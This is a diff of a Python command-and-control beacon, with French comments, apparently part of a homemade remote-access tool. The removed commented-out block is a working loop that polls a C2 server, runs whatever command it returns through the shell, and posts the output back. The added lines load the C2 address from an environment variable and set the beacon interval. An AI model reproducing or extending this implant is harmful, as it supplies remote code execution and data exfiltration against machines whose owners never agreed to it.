@@ -1,21 +1,5 @@
-# import time, urllib.request, subprocess
-# import uuid
-
-# SESSION_ID = str(uuid.uuid4())[:8]
-# C2 = "http://192.168.1.10:8000/"   # IP de ton PC
-
-# while True:
-#     try:
-#         cmd = urllib.request.urlopen(C2, timeout=5).read().decode() or "whoami"
-#         out = subprocess.run(cmd, shell=True, capture_output=True).stdout
-#         urllib.request.urlopen(C2, data=out, timeout=5)
-#     except Exception as e:
-#         print(f"[!] Erreur réseau : {e}")
-#     time.sleep(5)
-
-
-
 import json
+import os
 import subprocess
 import time
 import uuid
@@ -25,8 +9,10 @@ import urllib.error
 # ==============================
 # CONFIG
 # ==============================
-# C2_URL = "http://192.168.1.92:8000/"
-C2_URL = "http://10.84.107.141:8000"
+C2_URL = os.environ.get("C2_URL") #IP du serveur
+if not C2_URL:
+    raise RuntimeError("La variable d'environnement C2_URL doit être définie")
+
 BEACON_INTERVAL = 5           # secondes entre deux beacons
 REQUEST_TIMEOUT = 5           # secondes
 USER_AGENT = (
